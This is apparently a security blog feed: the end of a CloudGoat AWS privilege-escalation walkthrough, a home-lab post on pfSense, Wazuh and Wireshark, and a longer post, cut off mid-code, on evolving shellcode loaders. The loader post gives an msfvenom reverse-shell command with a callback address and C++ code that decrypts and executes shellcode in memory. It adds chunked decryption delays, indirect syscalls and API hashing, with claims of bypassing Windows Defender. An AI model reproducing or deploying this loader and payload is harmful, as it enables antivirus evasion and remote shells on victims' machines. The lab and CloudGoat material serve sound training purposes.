[CODE2]   --profile manager</span><br></pre></td></tr></table></figure><h3 id="Step-3-Verify-MFA-Setup"><a href="#Step-3-Verify-MFA-Setup" class="headerlink" title="Step 3: Verify MFA Setup"></a>Step 3: Verify MFA Setup</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam list-mfa-devices --user-name admin_cgidXXXXXXXXXX --profile manager</span><br></pre></td></tr></table></figure><h2 id="Role-Assumption-and-Secret-Access"><a href="#Role-Assumption-and-Secret-Access" class="headerlink" title="Role Assumption and Secret Access"></a>Role Assumption and Secret Access</h2><h3 id="Assume-the-Privileged-Role"><a href="#Assume-the-Privileged-Role" class="headerlink" title="Assume the Privileged Role"></a>Assume the Privileged Role</h3><p>With MFA configured, we can now assume the secrets manager role:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts assume-role   --role-arn arn:aws:iam::ACCOUNT-ID:role/cg_secretsmanager_cgidXXXXXXXXXX   --role-session-name admin-session   --serial-number arn:aws:iam::ACCOUNT-ID:mfa/admin-mfa   --token-code [MFA-CODE]   --profile admin</span><br></pre></td></tr></table></figure><p>Configure the temporary credentials and verify the assumed role:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity --profile assumed-role</span><br></pre></td></tr></table></figure><h3 id="Extract-the-Secret"><a href="#Extract-the-Secret" class="headerlink" title="Extract the Secret"></a>Extract the Secret</h3><p>List available secrets:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws secretsmanager list-secrets --profile assumed-role</span><br></pre></td></tr></table></figure><p>Retrieve the flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws secretsmanager get-secret-value   --secret-id cg_secret_cgidXXXXXXXXXX   --profile assumed-role</span><br></pre></td></tr></table></figure><p>Success! We’ve retrieved the flag: <code>flag{14m_PERM15510N5_4Re_5C4R_85ee********************************************}</code></p><h2 id="Automated-Exploitation"><a href="#Automated-Exploitation" class="headerlink" title="Automated Exploitation"></a>Automated Exploitation</h2><p>For those interested in automation, my AWS enumeration tool <a href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a> can identify and exploit these vulnerabilities automatically:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 aws_auditor.py</span><br></pre></td></tr></table></figure><h2 id="Key-Takeaways"><a href="#Key-Takeaways" class="headerlink" title="Key Takeaways"></a>Key Takeaways</h2><p>This scenario demonstrates several critical AWS security concepts:</p><ol><li>Tag-based Access Control Risks: Overly permissive tagging policies can lead to privilege escalation</li><li>IAM Policy Interactions: The combination of seemingly innocuous permissions can create dangerous attack paths</li><li>Access Key Management: Proper access key lifecycle management is crucial</li><li>MFA Implementation: While MFA adds security, it can be bypassed when attackers have sufficient IAM permissions</li></ol><h2 id="Cleanup"><a href="#Cleanup" class="headerlink" title="Cleanup"></a>Cleanup</h2><p>Always clean up your CloudGoat environments:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat destroy iam_privesc_by_key_rotation</span><br></pre></td></tr></table></figure><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>The <code>iam_privesc_by_key_rotation</code> scenario effectively demonstrates how IAM misconfigurations can lead to complete account compromise. The key lesson is that AWS IAM policies should follow the principle of least privilege, and tag-based access controls require careful consideration of their security implications.</p><p>By understanding these attack vectors, security professionals can better defend against similar vulnerabilities in production AWS environments.</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> CloudGoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Network Security Lab</title>
      <link href="/2025/05/23/Network-Security-Lab/"/>
      <url>/2025/05/23/Network-Security-Lab/</url>
      
        <content type="html"><![CDATA[<h1 id="Network-Security-Lab-Building-a-Virtual-Security-Environment"><a href="#Network-Security-Lab-Building-a-Virtual-Security-Environment" class="headerlink" title="Network Security Lab: Building a Virtual Security Environment"></a>Network Security Lab: Building a Virtual Security Environment</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Network security forms the backbone of modern cybersecurity infrastructure. Understanding how to properly configure firewalls, implement XDR&#x2F;SIEM (Extended Detection and Response&#x2F;Security Information and Event Management) systems, and monitor network traffic is essential for any security professional. This hands-on lab demonstrates the fundamentals of network security by building a complete virtual security environment using industry-standard tools.<br>In this comprehensive walkthrough, we’ll explore how to create a segmented network infrastructure, deploy security monitoring tools, and analyze network behavior to identify potential threats. This practical approach provides valuable insights into real-world network security implementations.</p><h2 id="Lab-Objectives"><a href="#Lab-Objectives" class="headerlink" title="Lab Objectives"></a>Lab Objectives</h2><p>The primary goal of this lab is to establish a foundational understanding of network security through practical implementation.</p><ul><li>Network segmentation and firewall configuration</li><li>XDR&#x2F;SIEM system deployment and configuration</li><li>Network traffic analysis and monitoring</li><li>Virtual network architecture design</li><li>Security rule implementation and testing</li></ul><h2 id="Tools-and-Technologies"><a href="#Tools-and-Technologies" class="headerlink" title="Tools and Technologies"></a>Tools and Technologies</h2><p>This lab leverages several powerful open-source and virtualization tools:</p><p><strong>Oracle VirtualBox:</strong> Serves as our virtualization platform, enabling the creation of multiple isolated virtual machines that simulate a real network environment.</p><p><strong>pfSense:</strong> Acts as our primary firewall and router solution, providing network segmentation, traffic filtering, and gateway services between network segments.</p><p><strong>Wazuh:</strong> Functions as our XDR&#x2F;SIEM (Extended Detection and Response&#x2F;Security Information and Event Management) system, offering real-time security monitoring, log analysis, threat detection, and centralized security event correlation capabilities.</p><p><strong>Wireshark:</strong> Provides network protocol analysis, allowing us to examine packet-level communications and understand network behavior.</p><h2 id="Initial-Challenges-and-Solutions"><a href="#Initial-Challenges-and-Solutions" class="headerlink" title="Initial Challenges and Solutions"></a>Initial Challenges and Solutions</h2><p>Setting up a virtual security lab presents several technical challenges that mirror real-world implementation difficulties:</p><p><strong>pfSense Configuration Complexity:</strong> The initial setup of pfSense in a virtual environment required extensive research into proper network adapter configuration and interface assignment. This was resolved through comprehensive documentation review and community tutorials.</p><p><strong>VirtualBox Network Adapter Configuration:</strong> Ensuring proper connectivity between virtual machines while maintaining network isolation required careful configuration of network adapters. The solution involved using NAT adapters for internet access and internal network adapters for LAN&#x2F;WAN segmentation.</p><p><strong>Wazuh Integration Challenges:</strong> Establishing communication between the Wazuh server and agents across network segments required understanding of firewall rules and network routing. This was addressed through systematic troubleshooting and configuration testing.</p><h2 id="Network-Architecture-Design"><a href="#Network-Architecture-Design" class="headerlink" title="Network Architecture Design"></a>Network Architecture Design</h2><p>The foundation of any secure network begins with proper architecture planning. For this lab, I designed a segmented virtual network that mirrors enterprise-level security implementations.<br>The architecture includes three primary components: a pfSense firewall acting as the network gateway, an Ubuntu server hosting the Wazuh XDR&#x2F;SIEM platform, and a LinuxMint workstation functioning as a monitored endpoint with the Wazuh agent installed.</p><p><img src="/images/Security_Lab/base_home_lab.png" alt="base_home_lab"></p><p>This design provides clear separation between network segments while enabling comprehensive security monitoring and threat detection capabilities. The pfSense firewall serves dual purposes as both router and security gateway, controlling traffic flow between the internal network and external internet access.</p><h2 id="Step-by-Step-Implementation"><a href="#Step-by-Step-Implementation" class="headerlink" title="Step-by-Step Implementation"></a>Step-by-Step Implementation</h2><h3 id="Phase-1-Virtual-Machine-Creation-and-Network-Setup"><a href="#Phase-1-Virtual-Machine-Creation-and-Network-Setup" class="headerlink" title="Phase 1: Virtual Machine Creation and Network Setup"></a>Phase 1: Virtual Machine Creation and Network Setup</h3><p>The first step involved creating the pfSense virtual machine using FreeBSD as the base operating system. This required configuring three distinct network adapters to establish proper network segmentation.<br>The primary adapter uses NAT configuration to provide internet connectivity, while two additional internal network adapters create isolated WAN and LAN segments. This configuration ensures that all internal network traffic must pass through the pfSense firewall, providing a controlled gateway for security monitoring and rule enforcement.</p><p><img src="/images/Security_Lab/firewall_config.png" alt="firewall_config"></p><p>After completing the pfSense setup, I proceeded to create the Ubuntu and LinuxMint virtual machines. Both systems were configured with single network adapters set to internal network mode, ensuring they would obtain internet access exclusively through the pfSense firewall rather than direct external connections.</p><h3 id="Phase-2-Firewall-Configuration-and-Rule-Implementation"><a href="#Phase-2-Firewall-Configuration-and-Rule-Implementation" class="headerlink" title="Phase 2: Firewall Configuration and Rule Implementation"></a>Phase 2: Firewall Configuration and Rule Implementation</h3><p>With the basic network infrastructure in place, the next phase focused on configuring the pfSense web interface to implement security policies. Access to the pfSense management interface was established through the internal network, allowing for comprehensive firewall rule configuration.<br>The primary security enhancement involved implementing rules to drop external ICMP (ping) requests, preventing external reconnaissance attempts while maintaining internal network connectivity. This configuration demonstrates how firewalls can selectively filter traffic based on source, destination, and protocol types.</p><p><img src="/images/Security_Lab/blocked_ping.png" alt="blocked_ping"></p><p>Network connectivity testing confirmed successful communication between the Ubuntu server, LinuxMint workstation, and pfSense firewall, with all systems properly obtaining IP addresses and routing through the configured network segments.</p><p><img src="/images/Security_Lab/ping_test.png" alt="ping_test"></p><p><img src="/images/Security_Lab/wan-lan.png" alt="wan-lan"></p><h3 id="Phase-3-Wazuh-XDR-SIEM-Deployment"><a href="#Phase-3-Wazuh-XDR-SIEM-Deployment" class="headerlink" title="Phase 3: Wazuh XDR&#x2F;SIEM Deployment"></a>Phase 3: Wazuh XDR&#x2F;SIEM Deployment</h3><p>The security monitoring component involved deploying Wazuh on the Ubuntu server following established installation procedures and best practices. This process included configuring the Wazuh manager, setting up the web interface, and establishing the foundational security monitoring infrastructure.<br>On the LinuxMint workstation, I installed the Wazuh agent and configured it to communicate with the Ubuntu-based Wazuh server. This agent-server relationship enables comprehensive endpoint monitoring, log collection, and security event correlation across the network.</p><p><img src="/images/Security_Lab/edr_agent_connected.png" alt="edr_agent_connected"></p><p>To validate the threat detection capabilities, I executed various commands that simulate potential security threats, including bash shell operations and system queries that might indicate malicious activity. The Wazuh system successfully detected and logged these activities, demonstrating its effectiveness in identifying suspicious behavior patterns.</p><p><img src="/images/Security_Lab/alerted_for_revshell_test.png" alt="alerted_for_revshell_test"></p><h3 id="Phase-4-Network-Traffic-Analysis"><a href="#Phase-4-Network-Traffic-Analysis" class="headerlink" title="Phase 4: Network Traffic Analysis"></a>Phase 4: Network Traffic Analysis</h3><p>The final implementation phase involved deploying Wireshark for comprehensive network traffic analysis. This tool provided visibility into the underlying network communications, revealing the constant exchange of information between system components.<br>Key observations included regular DNS queries from both Ubuntu and LinuxMint systems to the pfSense firewall, demonstrating normal network resolution processes. Additionally, periodic heartbeat signals from the Wazuh agent to the server confirmed proper agent-manager communication and system health monitoring.</p><p><em>(192.168.1.100 is ubuntu and 192.168.1.101 is LinuxMint and Firewall is on 192.168.1.1)</em></p><p><img src="/images/Security_Lab/dns_to_firewall-router.png" alt="dns_to_firewall-router"></p><p><img src="/images/Security_Lab/heartbeat_from_edr_agent.png" alt="heartbeat_from_edr_agent"></p><p><img src="/images/Security_Lab/ping_from_linux_mint.png" alt="ping_from_linux_mint"></p><h2 id="Results-and-Key-Achievements"><a href="#Results-and-Key-Achievements" class="headerlink" title="Results and Key Achievements"></a>Results and Key Achievements</h2><h3 id="Network-Security-Implementation"><a href="#Network-Security-Implementation" class="headerlink" title="Network Security Implementation"></a>Network Security Implementation</h3><p>The lab successfully demonstrated fundamental network security principles through practical implementation. The pfSense firewall configuration created effective network segmentation, with clear separation between WAN and LAN segments and controlled internet access for internal systems.<br>Security rule implementation proved effective, with external ping requests being properly blocked while maintaining internal network connectivity. This selective filtering approach demonstrates how firewalls can provide security without unnecessarily restricting legitimate network operations.</p><h3 id="XDR-SIEM-Capabilities"><a href="#XDR-SIEM-Capabilities" class="headerlink" title="XDR&#x2F;SIEM Capabilities"></a>XDR&#x2F;SIEM Capabilities</h3><p>The Wazuh deployment showcased comprehensive security monitoring capabilities, with successful detection and logging of suspicious activities on monitored endpoints. The agent-server architecture provided centralized security event collection and analysis, enabling security teams to maintain visibility across distributed network environments.<br>Threat simulation exercises confirmed the system’s ability to identify potentially malicious activities, generating appropriate alerts and maintaining detailed logs for security incident investigation and response.</p><h3 id="Network-Visibility-and-Analysis"><a href="#Network-Visibility-and-Analysis" class="headerlink" title="Network Visibility and Analysis"></a>Network Visibility and Analysis</h3><p>Wireshark analysis provided valuable insights into network behavior, revealing normal operational patterns and confirming the effectiveness of implemented security measures. The ability to examine packet-level communications offers security professionals detailed understanding of network activity and potential security implications.<br>Traffic analysis confirmed proper DNS resolution, agent communication, and firewall rule enforcement, validating the overall network security architecture and implementation.</p><h2 id="Practical-Applications-and-Learning-Outcomes"><a href="#Practical-Applications-and-Learning-Outcomes" class="headerlink" title="Practical Applications and Learning Outcomes"></a>Practical Applications and Learning Outcomes</h2><p>This hands-on lab experience provides foundational knowledge applicable to real-world network security implementations. The skills developed include virtual network design, firewall configuration, security monitoring deployment, and network traffic analysis.<br>Understanding these concepts enables security professionals to design and implement effective network security architectures, deploy comprehensive monitoring solutions, and analyze network behavior to identify potential security threats.</p><p>The practical experience gained through this lab serves as a foundation for more advanced security implementations and provides the technical skills necessary for effective network security management in enterprise environments.</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XOR Shellcode loader</title>
      <link href="/2025/05/22/XOR-Shellcode-loader/"/>
      <url>/2025/05/22/XOR-Shellcode-loader/</url>
      
        <content type="html"><![CDATA[<h1 id="Evolving-Shellcode-Loaders-From-Basic-XOR-to-API-Hashing-and-Indirect-Syscalls"><a href="#Evolving-Shellcode-Loaders-From-Basic-XOR-to-API-Hashing-and-Indirect-Syscalls" class="headerlink" title="Evolving Shellcode Loaders: From Basic XOR to API Hashing and Indirect Syscalls"></a>Evolving Shellcode Loaders: From Basic XOR to API Hashing and Indirect Syscalls</h1><blockquote><p>⚠️ DISCLAIMER:<br>This post is intended strictly for educational purposes. The techniques and code discussed are meant to demonstrate how malware obfuscation and evasion tactics evolve, particularly in the context of defensive research, red teaming, and antivirus testing.<br>I do not condone the use of this information for illegal or malicious purposes and am not responsible for how others choose to use it. The code shared is not production-safe and must not be used in real-world environments without proper authorization.</p></blockquote><hr><h2 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h2><p>This post documents an experimental shellcode execution project developed in C++. The goal was to explore progressively more evasive techniques to defeat Windows Defender and similar AVs, starting from basic encoding up to polymorphic loaders with indirect syscalls and API hashing.</p><hr><h2 id="Initial-Payload"><a href="#Initial-Payload" class="headerlink" title="Initial Payload"></a>Initial Payload</h2><p>Generated with <code>msfvenom</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.2.5 lport=8000 -f c &gt; shell_code.txt</span><br></pre></td></tr></table></figure><hr><h2 id="Version-1-Basic-XOR-Encoding"><a href="#Version-1-Basic-XOR-Encoding" class="headerlink" title="Version 1: Basic XOR Encoding"></a>Version 1: Basic XOR Encoding</h2><p>In the first version, a static XOR key (<code>&quot;verysecurepassword&quot;</code>) is used to encrypt the shellcode. The key is reused during decryption.</p><h3 id="Encoder-Snippet"><a href="#Encoder-Snippet" class="headerlink" title="Encoder Snippet"></a>Encoder Snippet</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">xor_encrypt</span><span class="params">(std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;&amp; data, <span class="type">const</span> std::string&amp; key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; data.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        data[i] ^= key[i % key.<span class="built_in">size</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Loader-Decryption-Logic"><a href="#Loader-Decryption-Logic" class="headerlink" title="Loader Decryption Logic"></a>Loader Decryption Logic</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">xor_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">size_t</span> size, <span class="type">const</span> std::string&amp; key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        data[i] ^= key[i % key.<span class="built_in">size</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Execution-Logic"><a href="#Execution-Logic" class="headerlink" title="Execution Logic"></a>Execution Logic</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* exec_mem = <span class="built_in">VirtualAlloc</span>(<span class="literal">nullptr</span>, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(exec_mem, encrypted_shellcode, shellcode_size);</span><br><span class="line"><span class="built_in">VirtualProtect</span>(exec_mem, shellcode_size, PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class="line"><span class="built_in">CreateThread</span>(<span class="literal">nullptr</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)exec_mem, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="literal">nullptr</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/Shell_Loader/Xor_runner.png" alt="Xor_runner">  <img src="/images/Shell_Loader/antivirus_flaged.png" alt="antivirus_flaged">  <img src="/images/Shell_Loader/V1_detection.png" alt="V1_detection"></p><hr><h2 id="Version-2-XOR-Polymorphic-Key"><a href="#Version-2-XOR-Polymorphic-Key" class="headerlink" title="Version 2: XOR + Polymorphic Key"></a>Version 2: XOR + Polymorphic Key</h2><p>Random XOR key is generated during encryption. Output header includes the key and encrypted shellcode.</p><h3 id="Key-Generation-Header-Output"><a href="#Key-Generation-Header-Output" class="headerlink" title="Key Generation + Header Output"></a>Key Generation + Header Output</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::string <span class="title">generate_random_key</span><span class="params">(<span class="type">size_t</span> length)</span> </span>&#123;</span><br><span class="line">    std::string charset = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">    std::string key;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">        key += charset[<span class="built_in">rand</span>() % charset.<span class="built_in">size</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">output &lt;&lt; <span class="string">&quot;// Polymorphic XOR Key (length: &quot;</span> &lt;&lt; key.<span class="built_in">size</span>() &lt;&lt; <span class="string">&quot;)</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">output &lt;&lt; <span class="string">&quot;unsigned char xor_key[] = &#123; &quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; key.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">    output &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::uppercase &lt;&lt; (<span class="type">int</span>)(<span class="type">unsigned</span> <span class="type">char</span>)key[i];</span><br><span class="line">    <span class="keyword">if</span> (i != key.<span class="built_in">size</span>() - <span class="number">1</span>) output &lt;&lt; (<span class="built_in">rand</span>() % <span class="number">2</span> ? <span class="string">&quot;, &quot;</span> : <span class="string">&quot;,</span></span><br><span class="line"><span class="string">  &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">output &lt;&lt; <span class="string">&quot;&#125;;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/images/Shell_Loader/V2_Detection.png" alt="V2_Detection"></p><hr><h2 id="Version-3-Polymorphic-Loader-Generator"><a href="#Version-3-Polymorphic-Loader-Generator" class="headerlink" title="Version 3: Polymorphic Loader Generator"></a>Version 3: Polymorphic Loader Generator</h2><p>This version dynamically generates both the encrypted shellcode and the loader (<code>decoder.cpp</code>) with randomized identifiers and one of multiple decryption variants.</p><h3 id="Polymorphic-Functions-Three-Variants"><a href="#Polymorphic-Functions-Three-Variants" class="headerlink" title="Polymorphic Functions (Three Variants)"></a>Polymorphic Functions (Three Variants)</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt1</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">size_t</span> len, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">        data[i] ^= key[i % xor_key_len];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt2</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">size_t</span> len, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* key)</span> </span>&#123;</span><br><span class="line">    <span class="type">size_t</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        data[i] = data[i] ^ key[k];</span><br><span class="line">        k = (k + <span class="number">1</span>) % xor_key_len;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt3</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">size_t</span> len, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* key)</span> </span>&#123;</span><br><span class="line">    <span class="type">size_t</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (idx &lt; len) &#123;</span><br><span class="line">        data[idx] ^= key[idx % xor_key_len];</span><br><span class="line">        ++idx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/Shell_Loader/V3_Bypasses_AV_defender.png" alt="V3_Bypasses_AV_defender">  <a href="/images/Shell_Loader/V3_Detection.png">V3_Detection</a></p><hr><h2 id="Version-4-Chunked-Decode-Delays"><a href="#Version-4-Chunked-Decode-Delays" class="headerlink" title="Version 4: Chunked Decode + Delays"></a>Version 4: Chunked Decode + Delays</h2><p>Decryption is split into chunks with random delays, simulating benign runtime behavior.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">delayed_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">size_t</span> len, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* key)</span> </span>&#123;</span><br><span class="line">    <span class="type">size_t</span> chunk_size = <span class="number">32</span> + (<span class="built_in">rand</span>() % <span class="number">32</span>);</span><br><span class="line">    <span class="type">size_t</span> offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (offset &lt; len) &#123;</span><br><span class="line">        <span class="type">size_t</span> current_chunk = (offset + chunk_size &gt; len) ? (len - offset) : chunk_size;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; current_chunk; ++i) &#123;</span><br><span class="line">            data[offset + i] ^= key[(offset + i) % xor_key_len];</span><br><span class="line">        &#125;</span><br><span class="line">        offset += current_chunk;</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">500</span> + (<span class="built_in">rand</span>() % <span class="number">500</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/Shell_Loader/V4_DETECTION.png" alt="V4_DETECTION">  <a href="/images/Shell_Loader/V4_NO_TRIGGER.png">V4_NO_TRIGGER</a></p><p>And we didnt get flagged by defender</p><hr><h2 id="Version-5-Indirect-Syscalls"><a href="#Version-5-Indirect-Syscalls" class="headerlink" title="Version 5: Indirect Syscalls"></a>Version 5: Indirect Syscalls</h2><p>Implemented indirect system calls by manually resolving <code>ntdll</code> exports and calling them via function pointers.</p><h3 id="Stub-Resolver"><a href="#Stub-Resolver" class="headerlink" title="Stub Resolver"></a>Stub Resolver</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span>* <span class="title">resolve_stub</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* name)</span> </span>&#123;</span><br><span class="line">    HMODULE ntdll = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!ntdll) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="type">void</span>* addr = <span class="built_in">GetProcAddress</span>(ntdll, name);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* p = (<span class="type">unsigned</span> <span class="type">char</span>*)addr;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p[i] == <span class="number">0x4C</span> &amp;&amp; p[i + <span class="number">1</span>] == <span class="number">0x8B</span>)</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">void</span>*)(p + i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/Shell_Loader/v5.png" alt="v5">  <img src="/images/Shell_Loader/defender_check.png" alt="defender_check">  <img src="/images/Shell_Loader/gocheck_pass.png" alt="gocheck_pass"></p><hr><h2 id="Version-6-API-Hashing-Indirect-Syscalls"><a href="#Version-6-API-Hashing-Indirect-Syscalls" class="headerlink" title="Version 6: API Hashing + Indirect Syscalls"></a>Version 6: API Hashing + Indirect Syscalls</h2><p>Combined MurmurHash3 API hashing and export table parsing to resolve syscall stubs without using function names.</p><h3 id="MurmurHash3-Snippet"><a href="#MurmurHash3-Snippet" class="headerlink" title="MurmurHash3 Snippet"></a>MurmurHash3 Snippet</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">murmur_hash</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* key)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> seed = <span class="number">0x5A5A5A5A</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> h = seed;</span><br><span class="line">    <span class="type">size_t</span> len = <span class="built_in">strlen</span>(key);</span><br><span class="line">    <span class="comment">// ... truncated for brevity ...</span></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span 